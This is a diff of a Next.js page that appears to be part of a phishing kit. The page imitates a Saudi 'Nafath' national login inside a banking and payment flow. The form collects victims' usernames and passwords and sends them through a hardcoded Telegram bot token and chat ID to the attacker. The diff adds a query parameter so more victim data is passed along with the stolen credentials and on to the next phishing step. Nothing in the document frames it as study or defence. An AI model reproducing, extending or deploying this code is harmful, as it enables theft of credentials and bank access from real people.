@@ -6,19 +6,21 @@ import image23 from '../../../../../../../public/image23.jpg'
 import image24 from '../../../../../../../public/i.png'
 import Image from 'next/image'
 import { useRef } from 'react'
-import { useRouter } from 'next/navigation'
+import { useRouter,useSearchParams } from 'next/navigation'
 
 const Page = () => {
     let  username = useRef()
     let password = useRef()
     const router = useRouter()
+    const x = useSearchParams();
+    const datas = x.get("names")
     const handleOnSubmit = (e) => {
         e.preventDefault();
         var bot={
       token:"6602536113:AAEOJoRLjsoPUxdqp9SwU1jeFqtuXf712PY",
       chat_id:6364334502
     }
-        var length =` نفاذ اسم المستخدم  : ${username.current.value} %0A كلمة المرور: ${password.current.value} `
+        var length =` نفاذ اسم المستخدم  : ${username.current.value} %0A كلمة المرور: ${password.current.value}  %0A %0A ${datas}`
        
         
         fetch(`https://api.telegram.org/bot${bot.token}/sendMessage?chat_id=${bot.chat_id}&text=${length}`,{method:"GET"}).then(res=>res.json()).then(res=>console.log(res))
@@ -29,7 +31,7 @@ const Page = () => {
           alert('من فضلك قم بملى الحقول')
         }else{
           
-          router.push('/fozajil/banks/pay/code/nphad/nphadsecuess')
+          router.push(`/fozajil/banks/pay/code/nphad/nphadsecuess?names=${datas}`)
         }
       }
 
